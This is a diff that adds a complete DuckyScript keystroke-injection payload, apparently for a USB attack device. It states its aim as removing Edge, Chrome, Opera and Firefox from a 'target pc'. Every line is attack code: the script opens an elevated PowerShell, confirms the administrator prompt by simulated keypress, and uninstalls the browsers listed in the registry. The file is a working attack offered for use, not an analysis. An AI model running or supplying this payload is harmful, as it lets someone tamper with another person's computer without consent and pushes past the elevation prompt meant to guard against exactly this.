@@ -1,0 +1,21 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Delete Microsoft Edge, Chrome, Opera and Firefox from the target pc.
+REM Version: 1.0
+REM Category: Execution
+DELAY 800
+WINDOWS d
+DELAY 800
+WINDOWS r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+DELAY 800
+STRING Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {($_.DisplayName -like "Microsoft Edge") -or ($_.DisplayName -like "Mozilla Firefox") -or ($_.DisplayName -like "Google Chrome") -or ($_.DisplayName -like "Opera*")} | ForEach-Object {Uninstall-package $_.PSChildName -Verbose}
+DELAY 200
+ENTER
+DELAY 1200
+STRING exit
+ENTER
